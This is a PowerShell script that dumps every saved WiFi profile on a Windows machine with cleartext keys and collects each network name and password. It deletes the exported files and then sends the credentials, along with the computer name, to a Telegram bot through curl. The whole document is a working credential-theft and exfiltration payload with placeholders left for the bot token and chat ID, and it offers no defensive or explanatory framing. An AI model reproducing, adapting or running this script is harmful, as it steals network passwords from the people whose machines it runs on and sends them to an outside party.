# Get computer name
$hostname = $env:COMPUTERNAME

# Formatted header with computer name
$output="<b>WiFi Passwords from $hostname</b>"; 

# Exporting profiles
netsh wlan export profile key=clear; 

# Processing all profiles
Get-ChildItem *.xml | ForEach-Object { 
    $xml=[xml](Get-Content $_);
    
    # Escape special characters
    $ssid=[System.Net.WebUtility]::HtmlEncode($xml.WLANProfile.SSIDConfig.SSID.name);
    $pass=[System.Net.WebUtility]::HtmlEncode($xml.WLANProfile.MSM.security.sharedKey.keyMaterial);
    
    # add to output
    $output+="`n`n<b>SSID:</b> <i>$ssid</i>`n<b>Password:</b> <code>$pass</code>";
    Remove-Item $_ 
}; 

# Send to telegram
curl.exe -s -X POST "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage" `
    -d "chat_id=<USER_OR_CHAT_ID>" `
    -d "text=$output" `
    -d "parse_mode=HTML"